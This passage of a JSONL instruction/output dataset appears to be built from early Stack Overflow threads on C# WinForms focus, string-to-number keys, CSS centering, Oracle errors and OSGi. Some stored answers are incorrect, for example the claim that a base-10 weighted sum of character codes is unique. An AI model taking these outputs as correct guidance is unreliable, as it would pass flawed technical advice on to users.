both together) worked. I am curious as to what is evil about using threading? I am not using Application.Run and I have yet to have a problem. I am using a mediator class that both the parent thread and the child thread have access to. In that object I am using a ReaderWriterLock to lock one property that represents the message that I want displayed on the form that the child thread creates. The parent locks the property then writes what should be displayed. The child thread locks the property and reads what it should change the label on the form to. The child has to do this on a polling interval (I default it to 500ms) which I'm not real happy about, but I could not find an event driven way to let the child thread know that the proerty had changed, so I'm stuck with polling.", "output": "You shouldn't need to import any win32 functions for this.  If .Focus() isn't enough the form should also have a .BringToFront() method you can use.  If that fails, you can set it's .TopMost property to true.  You don't want to leave it true forever, so then call Application.DoEvents so the form can process that message and set it back to false."}
{"instruction": "I am looking for a way to create an int\\long representation of an arbitrary alpha-numeric String. Hash codes won't do it, because I can't afford hash collisions i.e. the representation must be unique and repeatable. \nThe numeric representation will be used to perform efficient (hopefully) compares. The creation of the numeric key will take some time, but it only has to happen once, whereas I need to perform vast numbers of comparisons with it - which will hopefully be much faster than comparing the raw Strings.\nAny other idea's on faster String comparison will be most appreciated too...", "output": "If you don't want collisions, try something insane like SHA-512. I can't guarantee there won't be collisions, but I don't think they have found any yet."}
{"instruction": "I am looking for a way to create an int\\long representation of an arbitrary alpha-numeric String. Hash codes won't do it, because I can't afford hash collisions i.e. the representation must be unique and repeatable. \nThe numeric representation will be used to perform efficient (hopefully) compares. The creation of the numeric key will take some time, but it only has to happen once, whereas I need to perform vast numbers of comparisons with it - which will hopefully be much faster than comparing the raw Strings.\nAny other idea's on faster String comparison will be most appreciated too...", "output": "Assuming \"alphanumeric\" means letters and numbers, you could treat each letter/number as a base-36 digit. Unfortunately, large strings will cause the number to grow rapidly and you'd have to resort to big integers, which are hardly efficient.\nIf your strings are usually different when you make the comparison (i.e. searching for a specific string) the hash might be your best option. Once you get a potential hit, you can do the string comparison to be sure. A well-designed hash will make collisions exceedingly rare."}
{"instruction": "I am looking for a way to create an int\\long representation of an arbitrary alpha-numeric String. Hash codes won't do it, because I can't afford hash collisions i.e. the representation must be unique and repeatable. \nThe numeric representation will be used to perform efficient (hopefully) compares. The creation of the numeric key will take some time, but it only has to happen once, whereas I need to perform vast numbers of comparisons with it - which will hopefully be much faster than comparing the raw Strings.\nAny other idea's on faster String comparison will be most appreciated too...", "output": "It would seem that an MD5 hash would work fine.  The risk of a hash collision would be extremely unlikely.  Depending on the length of your string, a hash that generates an int/long would run into max value problems very quickly."}
{"instruction": "I\u2019ve writen a little python script that just pops up a message box containing the text passed on the command line. I want to pop it up only when the window \u2014resulting from a previous call\u2014 is not open.\nfrom Tkinter import *\nimport tkMessageBox\n\nroot = Tk()\nroot.withdraw() \n\n# TODO not if a window with this title exists\ntkMessageBox.showinfo(\"Key you!\", \" \".join(sys.argv[1:]))\n\nAny idea how to check that?", "output": "I believe you want:\nif 'normal' != root.state():\n    tkMessageBox.showinfo(\"Key you!\", \" \".join(sys.argv[1:]))"}
{"instruction": "I am looking for a way to create an int\\long representation of an arbitrary alpha-numeric String. Hash codes won't do it, because I can't afford hash collisions i.e. the representation must be unique and repeatable. \nThe numeric representation will be used to perform efficient (hopefully) compares. The creation of the numeric key will take some time, but it only has to happen once, whereas I need to perform vast numbers of comparisons with it - which will hopefully be much faster than comparing the raw Strings.\nAny other idea's on faster String comparison will be most appreciated too...", "output": "Why don't you do something like 1stChar + (10 x 2ndChar) + 100 x (3rdChar) ...., where you use the simple integer value of each character, i.e. a = 1, b = 2 etc, or just the integer value if it's not a letter. This will give a unique value for each string, even for 2 strings that are just the same letters in a different order.\nOf course if gets more complicated if you need to worry about Unicode rather than just ASCII and the numbers could get large if you need to use long string.\nAre the standard Java string comparison functions definitely not efficient enough?"}
{"instruction": "I am looking for a way to create an int\\long representation of an arbitrary alpha-numeric String. Hash codes won't do it, because I can't afford hash collisions i.e. the representation must be unique and repeatable. \nThe numeric representation will be used to perform efficient (hopefully) compares. The creation of the numeric key will take some time, but it only has to happen once, whereas I need to perform vast numbers of comparisons with it - which will hopefully be much faster than comparing the raw Strings.\nAny other idea's on faster String comparison will be most appreciated too...", "output": "How long are the strings? If they are very short, then a unique ID can be generated by considering the characters as digits in base 36 (26 + 10) that form a n-digits number where n is the length of the string. On the other hand, if the strings are short enough to allow this, direct comparison won't be an issue anyway.\nOtherwise you'll have to generate a collision-free hash and this can only be done when the complete problem space is known in advance (i.e. if you know all strings that can possibly occur). You will want to have a look at perfect hashing, although the only feasible algorithm to find a perfect hash function that I know is probabilistic so collisions are still theoretically possible.\nThere might be other ways to find such a function. Knuth called this a \u201crather amusing \u2026\u00a0puzzle\u201d in TAoCP but he doesn't give an algorithm either.\nIn general, you give way too few information to find an algorithm that doesn't require probing the whole problem space in some manner. This does invariably mean that the problem has exponential running time but could be solved using machine-learning heuristics. I'm not sure if this is advisable in your case."}
{"instruction": "I am looking for a way to create an int\\long representation of an arbitrary alpha-numeric String. Hash codes won't do it, because I can't afford hash collisions i.e. the representation must be unique and repeatable. \nThe numeric representation will be used to perform efficient (hopefully) compares. The creation of the numeric key will take some time, but it only has to happen once, whereas I need to perform vast numbers of comparisons with it - which will hopefully be much faster than comparing the raw Strings.\nAny other idea's on faster String comparison will be most appreciated too...", "output": "Perhaps:\nString y = \"oiu291981u39u192u3198u389u28u389u\";\nBigInteger bi = new BigInteger(y, 36);\nSystem.out.println(bi);"}
{"instruction": "I am looking for a way to create an int\\long representation of an arbitrary alpha-numeric String. Hash codes won't do it, because I can't afford hash collisions i.e. the representation must be unique and repeatable. \nThe numeric representation will be used to perform efficient (hopefully) compares. The creation of the numeric key will take some time, but it only has to happen once, whereas I need to perform vast numbers of comparisons with it - which will hopefully be much faster than comparing the raw Strings.\nAny other idea's on faster String comparison will be most appreciated too...", "output": "A few questions in the beginning:\n\nDid you test that simple string comparison is too slow? \nHow the comparison looks like ('ABC' == 'abc' or 'ABC' != 'abc')?  \nHow many string do you have to compare? \nHow many comparison do you have to do?\nHow your strings look like (the length, letter case)?\n\nAs far as I remember String in Java is an object and two identical strings point to the same object.\nSo, maybe it would be enough to compare objects (probably string comparison is already implemented in this way).\nIf it doesn't help you can try to use Pascal implementation of string object when first element is length and if your strings have various length this should save some CPU time."}
{"instruction": "I am looking for a way to create an int\\long representation of an arbitrary alpha-numeric String. Hash codes won't do it, because I can't afford hash collisions i.e. the representation must be unique and repeatable. \nThe numeric representation will be used to perform efficient (hopefully) compares. The creation of the numeric key will take some time, but it only has to happen once, whereas I need to perform vast numbers of comparisons with it - which will hopefully be much faster than comparing the raw Strings.\nAny other idea's on faster String comparison will be most appreciated too...", "output": "Unless your string is limited in length, you can't avoid collisions. \nThere are 4294967296 possible values for an integer (2^32). If you have a string of more than 4 ASCII characters, or more than two unicode characters, then there are more possible string values than possible integer values. You can't have a unique integer value for every possible 5 character string. Long values have more possible values, but they would only provide a unique value for every possible string of 8 ASCII characters.\nHash codes are useful as a two step process: first see if the hash code matches, then check the whole string. For most strings that don't match, you only need to do the first step, and it's really fast."}
{"instruction": "I am looking for a way to create an int\\long representation of an arbitrary alpha-numeric String. Hash codes won't do it, because I can't afford hash collisions i.e. the representation must be unique and repeatable. \nThe numeric representation will be used to perform efficient (hopefully) compares. The creation of the numeric key will take some time, but it only has to happen once, whereas I need to perform vast numbers of comparisons with it - which will hopefully be much faster than comparing the raw Strings.\nAny other idea's on faster String comparison will be most appreciated too...", "output": "String length may vary, but let's say 10 characters for now.\n\nIn that case, in order to guarantee uniqueness you'd have to use some sort of big integer representation.  I doubt that doing comparisons on big integers would be substantially faster than doing string comparisons in the first place.  I'll second what other's have said here, use some sort of hash, then in the event of a hash match check the original strings to weed out any collisions.\nIn any case, If your strings are around 10 characters, I doubt that comparing, say, a bunch of 32 bit hashes will be all that much faster than direct string comparisons.  I think you have to ask yourself if it's it really worth the additional complexity."}
{"instruction": "I am looking for a way to create an int\\long representation of an arbitrary alpha-numeric String. Hash codes won't do it, because I can't afford hash collisions i.e. the representation must be unique and repeatable. \nThe numeric representation will be used to perform efficient (hopefully) compares. The creation of the numeric key will take some time, but it only has to happen once, whereas I need to perform vast numbers of comparisons with it - which will hopefully be much faster than comparing the raw Strings.\nAny other idea's on faster String comparison will be most appreciated too...", "output": "At the end of the day, a single alphanumeric character has at least 36 possible values.  If you include punctuation, lower case, etc then you can easily pass 72 possible values.\nA non-colliding number that allows you to quickly compare strings would necessarily grow exponentially with the length of the string.\nSo you first must decide on the longest string you are expecting to compare.  Assuming it's N characters in length, and assuming you ONLY need uppercase letters and the numerals 0-9 then you need to have an integer representation that can be as high as\n36^N\nFor a string of length 25 (common name field) then you end up needing a binary number with  130 bits.\nIf you compose that into 32 bit numbers, you'll need 4.  Then you can compare each number (four integer compares should take no time, compared to walking the string).  I would recommend a big number library, but for this specialized case I'm pretty sure you can write your own and get better performance.\nIf you want to handle 72 possible values per character (uppercase, lowercase, numerals, punctuation...) and you need 10 characters, then you'll need 62 bits - two 32 bit integers (or one 64 bit if you're on a system that supports 64 bit computing)\nIf, however, you are not able to restrict the numbers in the string (ie, could be any of the 256 letters/numbers/characters/etc) and you can't define the size of the string, then comparing the strings directly is the only way to go, but there's a shortcut.\nCast the pointer of the string to a 32 bit unsigned integer array, and compare the string 4 bytes at a time (or 64 bits/8bytes at a time on a 64 bit processor).  This means that a 100 character string only requires 25 compares maximum to find which is greater.\nYou may need to re-define the character set (and convert the strings) so that the characters with higher precedence are assigned values closer to 0, and lower precedence values closer to 255 (or vice versa, depending on how you are comparing them).\nGood luck!"}
{"instruction": "What web site structure(s)/architecture(s) would the community swear by, with a narrowing down in the direction towards more of a small facebook style project?\nI understand the question to be rather broad/subjective; but being relatively new to the area of web development, I find just looking at and learning from examples of working projects most times extremely helpful, and that at other times just blows my mind and changes how I construct future assignments.\nWith the latter paragraph in mind, does the community have any suggestions on places to look/articles to read?", "output": "Possibly a bit heavy for your immediate needs, but have you seen the Polar bear*?  Well worth a browse in the library to see if it's what you require.\n*Information Architecture for the World Wide Web, Second Edition"}
{"instruction": "What web site structure(s)/architecture(s) would the community swear by, with a narrowing down in the direction towards more of a small facebook style project?\nI understand the question to be rather broad/subjective; but being relatively new to the area of web development, I find just looking at and learning from examples of working projects most times extremely helpful, and that at other times just blows my mind and changes how I construct future assignments.\nWith the latter paragraph in mind, does the community have any suggestions on places to look/articles to read?", "output": "I guess it depends on the technology you select. For web projects in general I've always employed (Web-)MVC for the past two years or so. The advantage being a clear seperation of frontend and backend in order to create a managable code base.\nBut that's as vague as a recommendation could be. :)\nAside from using a framework to build your site from scratch, you might also want to look into using what's already out there (in terms of open source). I'd recommend any kind of \"community software\" that's semi-established, well documented, not too often in the news because of security issues and offers API to extend its base. That could indeed jump start you on your facebook-esque site. ;)"}
{"instruction": "I'm writing my first iPhone app, so I haven't gotten around to figuring out much in the way of debugging.\nEssentially my app displays an image and when touched plays a short sound.\nWhen compiling and building the project in XCode, everything builds successfully, but when the app is run in the iPhone simulator, it crashes.\nI get the following error:\nApplication Specific Information:\niPhone Simulator 1.0 (70), iPhone OS 2.0 (5A331)\n*** Terminating app due to uncaught exception 'NSUnknownKeyException', \nreason: '[<UIView 0x34efd0> setValue:forUndefinedKey:]: this class is not key value \ncoding-compliant for the key kramerImage.'\n\nkramerImage here is the image I'm using for the background.\nI'm not sure what NSUnknownKeyException means or why the class is not key value coding-compliant for the key.", "output": "(This isn't really iPhone specific - the same thing will happen in regular Cocoa).\nNSUnknownKeyException is a common error when using Key-Value Coding to access a key that the object doesn't have.\nThe properties of most Cocoa objects can be accessing directly:\n[@\"hello world\" length]    // Objective-C 1.0\n@\"hello world\".length      // Objective-C 2.0\n\nOr via Key-Value Coding:\n[@\"hello world\" valueForKey:@\"length\"]\n\nI would get an NSUnknownKeyException if I used the following line:\n[@\"hello world\" valueForKey:@\"purpleMonkeyDishwasher\"]\n\nbecause NSString does not have a property (key) called 'purpleMonkeyDishwasher'.\nSomething in your code is trying to set a value for the key 'kramerImage' on an UIView, which (apparently) doesn't support that key.  If you're using Interface Builder, it might be something in your nib.\nFind where 'kramerImage' is being used, and try to track it down from there."}
{"instruction": "After lots of attempts and search I have never found a satisfactory way to do it with CSS2.\nA simple way to accomplish it is to wrap it into a handy <table> as shown in the sample below. Do you know how to do it avoiding table layouts and also avoiding quirky tricks?\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\">\n<html>\n<head>\n        <style type=\"text/css\">\n            table \n            {\n                margin:0px auto 0 auto;\n            }\n        </style>\n</head>\n    <body>\n        <table>\n            <tr>\n                <td>test<br/>test</td>\n            </tr>\n        </table>\n    </body>\n<html>\n\n\nWhat I want to know is how to do it without a fixed width and also being a block.", "output": "This is going to be the lamest answer, but it works:\nUse the deprecated <center> tag.\n:P\nI told you it would be lame. But, like I said, it works!\n*shudder*"}
{"instruction": "What web site structure(s)/architecture(s) would the community swear by, with a narrowing down in the direction towards more of a small facebook style project?\nI understand the question to be rather broad/subjective; but being relatively new to the area of web development, I find just looking at and learning from examples of working projects most times extremely helpful, and that at other times just blows my mind and changes how I construct future assignments.\nWith the latter paragraph in mind, does the community have any suggestions on places to look/articles to read?", "output": "Thanks, IainMH, Till. I'm without a formal computer science qualification and find large blanks in my knowledge.  Over the past couple of years I've gone surprisingly far, though knowing the underlining foundation of projects I've created pollute their efficiency and success.\nBeing a bit of a perfectionist doesn't help (what programmer isn't?) the headaches I get from looking at badly formed projects, that only to my knowing are badly formed only after stepping back and looking at how they're structured.  I guess it's a chicken and egg thing, but also a planning thing.\nAnyhow, what has helped is studying existing projects."}
{"instruction": "After lots of attempts and search I have never found a satisfactory way to do it with CSS2.\nA simple way to accomplish it is to wrap it into a handy <table> as shown in the sample below. Do you know how to do it avoiding table layouts and also avoiding quirky tricks?\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\">\n<html>\n<head>\n        <style type=\"text/css\">\n            table \n            {\n                margin:0px auto 0 auto;\n            }\n        </style>\n</head>\n    <body>\n        <table>\n            <tr>\n                <td>test<br/>test</td>\n            </tr>\n        </table>\n    </body>\n<html>\n\n\nWhat I want to know is how to do it without a fixed width and also being a block.", "output": "@Jason, yep, <center> works. Good times. I'll propose the following, though:\n  <!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\">\n  <html>\n     <head>\n        <style type=\"text/css\">\n           body\n           {\n              text-align: center;\n           }\n\n           div.my-centered-content\n           {\n              margin: 0 auto; /* Centering */\n              display: inline;\n           }\n        </style>\n        <title></title>\n     </head>\n     <body>\n        <div class=\"my-centered-content\">\n           <p>test</p>\n           <p>test</p>\n        </div>\n     </body>\n  </html>\n\nEDIT @Santi, a block-level element will fill the width of the parent container, so it will effectively be width:100% and the text will flow on the left, leaving you with useless markup and an uncentered element. You might want to try display: inline-block;. Firefox might complain, but it's right. Also, try adding a border: solid red 1px; to the CSS of the .my-centered-content DIV to see what's happening as you try these things out."}
{"instruction": "After lots of attempts and search I have never found a satisfactory way to do it with CSS2.\nA simple way to accomplish it is to wrap it into a handy <table> as shown in the sample below. Do you know how to do it avoiding table layouts and also avoiding quirky tricks?\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\">\n<html>\n<head>\n        <style type=\"text/css\">\n            table \n            {\n                margin:0px auto 0 auto;\n            }\n        </style>\n</head>\n    <body>\n        <table>\n            <tr>\n                <td>test<br/>test</td>\n            </tr>\n        </table>\n    </body>\n<html>\n\n\nWhat I want to know is how to do it without a fixed width and also being a block.", "output": "I think that your example would work just as well if you used a <div> instead of a <table>. The only difference is that the text in the <table> is also centered. If you want that too, just add the text-align: center; rule.\nAnother thing to keep in mind is that the <div> will by default fill up all the available horizontal space. Put a border on it if you aren't sure where it starts and ends."}
{"instruction": "If you've used Oracle, you've probably gotten the helpful message \"ORA-00942: Table or view does not exist\". Is there a legitimate technical reason the message doesn't include the name of the missing object? \nArguments about this being due to security sound like they were crafted by the TSA. If I'm an attacker, I'd know what table I just attempted to exploit, and be able to interpret this unhelpful message easily. If I'm a developer working with a complex join through several layers of application code, it's often very difficult to tell.\nMy guess is that when this error was originally implemented, someone neglected to add the object name, and now, people are afraid it will break compatibility to fix it. (Code doing silly things like parsing the error message will be confused if it changes.)\nIs there a developer-friendly (as opposed to recruiting your DBA) way to determine the name of the missing table?\n\nAlthough I've accepted an answer which is relevant to the topic, it doesn't really answer my question: Why isn't the name part of the error message? If anyone can come up with the real answer, I'll be happy to change my vote.", "output": "You can set an EVENT in your parameter file (plain text or spfile) to force Oracle to dump a detailed trace file in the user_dump_dest, the object name might be in there, if not the SQL should be.\nEVENT=\"942 trace name errorstack level 12\"\nIf you are using a plain text file you need to keep all your EVENT settings on consecutive lines. Not sure how that applied to spfile."}
{"instruction": "If you've used Oracle, you've probably gotten the helpful message \"ORA-00942: Table or view does not exist\". Is there a legitimate technical reason the message doesn't include the name of the missing object? \nArguments about this being due to security sound like they were crafted by the TSA. If I'm an attacker, I'd know what table I just attempted to exploit, and be able to interpret this unhelpful message easily. If I'm a developer working with a complex join through several layers of application code, it's often very difficult to tell.\nMy guess is that when this error was originally implemented, someone neglected to add the object name, and now, people are afraid it will break compatibility to fix it. (Code doing silly things like parsing the error message will be confused if it changes.)\nIs there a developer-friendly (as opposed to recruiting your DBA) way to determine the name of the missing table?\n\nAlthough I've accepted an answer which is relevant to the topic, it doesn't really answer my question: Why isn't the name part of the error message? If anyone can come up with the real answer, I'll be happy to change my vote.", "output": "If you are using a SQL browsing tool like TOAD or TORA it will help you with ORA errors by highlightling or pointing moving the cursor to where you made your error.\nCopy and paste your SQL in to one of these tools to help. You may also find the analyse info available useful too."}
{"instruction": "After lots of attempts and search I have never found a satisfactory way to do it with CSS2.\nA simple way to accomplish it is to wrap it into a handy <table> as shown in the sample below. Do you know how to do it avoiding table layouts and also avoiding quirky tricks?\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\">\n<html>\n<head>\n        <style type=\"text/css\">\n            table \n            {\n                margin:0px auto 0 auto;\n            }\n        </style>\n</head>\n    <body>\n        <table>\n            <tr>\n                <td>test<br/>test</td>\n            </tr>\n        </table>\n    </body>\n<html>\n\n\nWhat I want to know is how to do it without a fixed width and also being a block.", "output": "The following works well enough.  note the position, and the use of auto\n<div style=\"border: 1px solid black; \n\t\t    width: 300px; \n\t\t    height: 300px;\">\n            <div style=\"width: 150px; \n\t\t\t            height: 150px; \n\t\t\t            background-color: blue;\n                        position: relative;\n\t\t\t            left: auto;\n\t\t\t            right: auto;\n\t\t\t            margin-right: auto;\n\t\t\t            margin-left: auto;\">\n             </div>\n</div>\n\nNOTE: not sure if it works in IE."}
{"instruction": "So, I did search google and SO prior to asking this question. Basically I have a DLL that has a form compiled into it. The form will be used to display information to the screen. Eventually it will be asynchronous and expose a lot of customization in the dll. For now I just want it to display properly. The problem that I am having is that I use the dll by loading it in a Powershell session. So when I try to display the form and get it to come to the top and have focus, It has no problem with displaying over all the other apps, but I can't for the life of me get it to display over the Powershell window. Here is the code that I am currently using to try and get it to display. I am sure that the majority of it won't be required once I figure it out, this just represents all the things that I found via google.\nCLass Blah\n{\n        [DllImport(\"user32.dll\", EntryPoint = \"SystemParametersInfo\")]\n        public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);\n\n        [DllImport(\"user32.dll\", EntryPoint = \"SetForegroundWindow\")]\n        public static extern bool SetForegroundWindow(IntPtr hWnd);\n\n        [DllImport(\"User32.dll\", EntryPoint = \"ShowWindowAsync\")]\n        private static extern bool ShowWindowAsync(IntPtr hWnd, int cmdShow);\n        private const int WS_SHOWNORMAL = 1;\n\n    public void ShowMessage(string msg)\n    {\n            MessageForm msgFrm = new MessageForm();\n            msgFrm.lblMessage.Text = \"FOO\";\n            msgFrm.ShowDialog();\n            msgFrm.BringToFront();\n            msgFrm.TopMost = true;\n            msgFrm.Activate();\n\n            SystemParametersInfo((uint)0x2001, 0, 0, 0x0002 | 0x0001);\n            ShowWindowAsync(msgFrm.Handle, WS_SHOWNORMAL);\n            SetForegroundWindow(msgFrm.Handle);\n            SystemParametersInfo((uint)0x2001, 200000, 200000, 0x0002 | 0x0001);\n    }\n}\n\nAs I say I'm sure that most of that is either not needed or even flat out wrong, I just wanted to show the things that I had tried. Also, as I mentioned, I plan to have this be asynchronously displayed at some point which I suspect will wind up requiring a separate thread. Would splitting the form out into it's own thread make it easier to cause it to get focus over the Powershell session? \n\n@Joel, thanks for the info. Here is what I tried based on your suggestion:\nmsgFrm.ShowDialog();\nmsgFrm.BringToFront();\nmsgFrm.Focus();\nApplication.DoEvents();\n\nThe form still comes up under the Powershell session. I'll proceed with working out the threading. I've spawned threads before but never where the parent thread needed to talk to the child thread, so we'll see how it goes.\nThnks for all the ideas so far folks.\n\nOk, threading it took care of the problem. @Quarrelsome, I did try both of those. Neither (nor both together) worked. I am curious as to what is evil about using threading? I am not using Application.Run and I have yet to have a problem. I am using a mediator class that both the parent thread and the child thread have access to. In that object I am using a ReaderWriterLock to lock one property that represents the message that I want displayed on the form that the child thread creates. The parent locks the property then writes what should be displayed. The child thread locks the property and reads what it should change the label on the form to. The child has to do this on a polling interval (I default it to 500ms) which I'm not real happy about, but I could not find an event driven way to let the child thread know that the proerty had changed, so I'm stuck with polling.", "output": "Doesn't ShowDialog() have different window behavior than just Show()?\nWhat if you tried:\nmsgFrm.Show();\nmsgFrm.BringToFront();\nmsgFrm.Focus();"}
{"instruction": "So, I did search google and SO prior to asking this question. Basically I have a DLL that has a form compiled into it. The form will be used to display information to the screen. Eventually it will be asynchronous and expose a lot of customization in the dll. For now I just want it to display properly. The problem that I am having is that I use the dll by loading it in a Powershell session. So when I try to display the form and get it to come to the top and have focus, It has no problem with displaying over all the other apps, but I can't for the life of me get it to display over the Powershell window. Here is the code that I am currently using to try and get it to display. I am sure that the majority of it won't be required once I figure it out, this just represents all the things that I found via google.\nCLass Blah\n{\n        [DllImport(\"user32.dll\", EntryPoint = \"SystemParametersInfo\")]\n        public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);\n\n        [DllImport(\"user32.dll\", EntryPoint = \"SetForegroundWindow\")]\n        public static extern bool SetForegroundWindow(IntPtr hWnd);\n\n        [DllImport(\"User32.dll\", EntryPoint = \"ShowWindowAsync\")]\n        private static extern bool ShowWindowAsync(IntPtr hWnd, int cmdShow);\n        private const int WS_SHOWNORMAL = 1;\n\n    public void ShowMessage(string msg)\n    {\n            MessageForm msgFrm = new MessageForm();\n            msgFrm.lblMessage.Text = \"FOO\";\n            msgFrm.ShowDialog();\n            msgFrm.BringToFront();\n            msgFrm.TopMost = true;\n            msgFrm.Activate();\n\n            SystemParametersInfo((uint)0x2001, 0, 0, 0x0002 | 0x0001);\n            ShowWindowAsync(msgFrm.Handle, WS_SHOWNORMAL);\n            SetForegroundWindow(msgFrm.Handle);\n            SystemParametersInfo((uint)0x2001, 200000, 200000, 0x0002 | 0x0001);\n    }\n}\n\nAs I say I'm sure that most of that is either not needed or even flat out wrong, I just wanted to show the things that I had tried. Also, as I mentioned, I plan to have this be asynchronously displayed at some point which I suspect will wind up requiring a separate thread. Would splitting the form out into it's own thread make it easier to cause it to get focus over the Powershell session? \n\n@Joel, thanks for the info. Here is what I tried based on your suggestion:\nmsgFrm.ShowDialog();\nmsgFrm.BringToFront();\nmsgFrm.Focus();\nApplication.DoEvents();\n\nThe form still comes up under the Powershell session. I'll proceed with working out the threading. I've spawned threads before but never where the parent thread needed to talk to the child thread, so we'll see how it goes.\nThnks for all the ideas so far folks.\n\nOk, threading it took care of the problem. @Quarrelsome, I did try both of those. Neither (nor both together) worked. I am curious as to what is evil about using threading? I am not using Application.Run and I have yet to have a problem. I am using a mediator class that both the parent thread and the child thread have access to. In that object I am using a ReaderWriterLock to lock one property that represents the message that I want displayed on the form that the child thread creates. The parent locks the property then writes what should be displayed. The child thread locks the property and reads what it should change the label on the form to. The child has to do this on a polling interval (I default it to 500ms) which I'm not real happy about, but I could not find an event driven way to let the child thread know that the proerty had changed, so I'm stuck with polling.", "output": "TopMost = true;\n.Activate() ?\nEither of those any good?\nSplitting it out into its own thread is a bit evil as it wont work properly if you don't call it with Application.Run and that will swallow up the thread. In the worst case scenario I guess you could separate it out into a different process and communicate via the disk or WCF."}
{"instruction": "I want to implement an \"automatic update\" system for  a windows application. \nRight now I'm semi-manually creating an \"appcast\" which my program checks, and notifies the user that a new version is available. (I'm using\n NSIS for my installers).\nIs there software that I can use that will handle the \"automatic\" part of the updates, perhaps similar to  Sparkle on the mac? Any issues/pitfalls that I should be aware of?", "output": "I asked a similar question. Follow the link to see the responses.\nhttp://stackoverflow.com/questions/46013/self-updating"}
{"instruction": "After lots of attempts and search I have never found a satisfactory way to do it with CSS2.\nA simple way to accomplish it is to wrap it into a handy <table> as shown in the sample below. Do you know how to do it avoiding table layouts and also avoiding quirky tricks?\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\">\n<html>\n<head>\n        <style type=\"text/css\">\n            table \n            {\n                margin:0px auto 0 auto;\n            }\n        </style>\n</head>\n    <body>\n        <table>\n            <tr>\n                <td>test<br/>test</td>\n            </tr>\n        </table>\n    </body>\n<html>\n\n\nWhat I want to know is how to do it without a fixed width and also being a block.", "output": "<html>\n<head>\n\n    <title>untitled</title>\n    <style type=\"text/css\">\n    #wrapper {\n        width: 100%;\n    \tborder: 1px solid #333;\n    }\n    #content {\n    \twidth: 200px;\n    \tbackground: #00FF00;\n    }\n    </style>\n\n</head>\n\n<body>\n\n           <div id=\"wrapper\" align=\"center\">\n\n                 <div id=\"content\" align=\"left\"> Content Here </div>\n\n           </div>\n\n</body>\n</html>"}
{"instruction": "In Java 5 and above you have the foreach loop, which works magically on anything that implements Iterable:\nfor (Object o : list) {\n  doStuff(o);\n}\n\nHowever, Enumerable still does not implement Iterable, meaning that to iterate over an Enumeration you must do the following:\nfor(; e.hasMoreElements() ;) {\n  doStuff(e.nextElement());\n}\n\nDoes anyone know if there is a reason why Enumeration still does not implement Iterable?\nEdit: As a clarification, I'm not talking about the language concept of an enum, I'm talking a Java-specific class in the Java API called 'Enumeration'.", "output": "As an easy and clean way of using an Enumeration with the enhanced for loop, convert to an ArrayList with java.util.Collections.list.\nfor (TableColumn col : Collections.list(columnModel.getColumns()) {\n\n(javax.swing.table.TableColumnModel.getColumns returns Enumeration.)\nNote, this may be very slightly less efficient."}
{"instruction": "I'm working on a C# winforms application (VS.NET 2008, .NET 3.5 sp 1). I have a search field on a form, and rather than have a label next to the search field I'd like to show some grey text in the background of the search field itself ('Search terms', for example). When the user starts entering text in the search field the text should disappear. How can I achieve this?", "output": "You will need to use some P/Inovke interop code to do this. Look for the Win32 API SendMessage function and the EM_SETCUEBANNER message."}
{"instruction": "I'm working on a C# winforms application (VS.NET 2008, .NET 3.5 sp 1). I have a search field on a form, and rather than have a label next to the search field I'd like to show some grey text in the background of the search field itself ('Search terms', for example). When the user starts entering text in the search field the text should disappear. How can I achieve this?", "output": "There is built-in functionality in the text box control -- AutoCompleteMode and AutoCompleteSource.  They may be worth a try before you go into custom or 3rd party controls."}
{"instruction": "I'm working on a C# winforms application (VS.NET 2008, .NET 3.5 sp 1). I have a search field on a form, and rather than have a label next to the search field I'd like to show some grey text in the background of the search field itself ('Search terms', for example). When the user starts entering text in the search field the text should disappear. How can I achieve this?", "output": "Give the code from this link a try. It extends the winforms functionality, as it isn't possible to achieve right out of the box. The source code is available as well. Keep in mind, it only works on Win XP or higher.\nhttp://www.aaronlerch.com/blog/2007/12/01/watermarked-edit-controls/"}
{"instruction": "I'm working on a C# winforms application (VS.NET 2008, .NET 3.5 sp 1). I have a search field on a form, and rather than have a label next to the search field I'd like to show some grey text in the background of the search field itself ('Search terms', for example). When the user starts entering text in the search field the text should disappear. How can I achieve this?", "output": "I think the way this is generally done is to set the color of the text to gray and prefill it with your hint text.\nThen, write handlers for the text field's focus events, modifying the fields contents and color based when focus is gained and lost.  Here's some pseudocode (sorry, it's totally not C# code.  I have Actionscript on the brain right now):\nTextInput myInput;\nboolean showingHint = true;\n\nmyInput.text = \"Search Terms\";\nmyInput.color = 0xcccccc;\n\nmyInput.onFocusGained = function() {\n  if(showingHint) {\n    myInput.text = \"\";\n    myInput.color = 0x000000;\n    showingHint = false;\n  }\n}\n\nmyInput.onFocusLost = function() {\n  if(!showingHint && myInput.text.length == 0) {\n    myInput.text = \"Search Terms\";\n    myInput.color = 0xcccccc;\n    showingHint = true;\n  }\n}\n\nRemember, you only want to change the text on focus lost if the user hasn't manually changed the text.  Use a separate boolean to track if you're showing the hint or not so you can differentiate between the user manually typing your \"hint\" text as actual content.  Similarly, you only want to clear the contents of the input box if the hint is being displayed so you don't get rid of user input accidentally."}
{"instruction": "What makes a module/service/bit of application functionality a particularly good candidate for an OSGi module? \nI'm interested in using OSGi in my applications. We're a Java shop and we use Spring pretty extensively, so I'm leaning toward using Spring Dynamic Modules for OSGi(tm) Service Platforms. I'm looking for a good way to incorporate a little bit of OSGi into an application as a trial. Has anyone here used this or a similar OSGi technology? Are there any pitfalls? \n@Nicolas - Thanks, I've seen that one. It's a good tutorial, but I'm looking more for ideas on how to do my first \"real\" OSGi bundle, as opposed to a Hello World example.\n@david - Thanks for the link! Ideally, with a greenfield app, I'd design the whole thing to be dynamic. What I'm looking for right now, though, is to introduce it in a small piece of an existing application. Assuming I can pick any piece of the app, what are some factors to consider that would make that piece better or worse as an OSGi guinea pig?", "output": "There are a couple of thinks to keep in mind if you are starting with OSGi.\nAs mentioned elsewhere in this thread, knowing about classloading is really important. In my experience everybody sooner or later runs into problems with it.\nAnother important thing to remember is: never hold references! Have a look at the whiteboard pattern on which the services concept of OSGi is build (see the link in one of the other 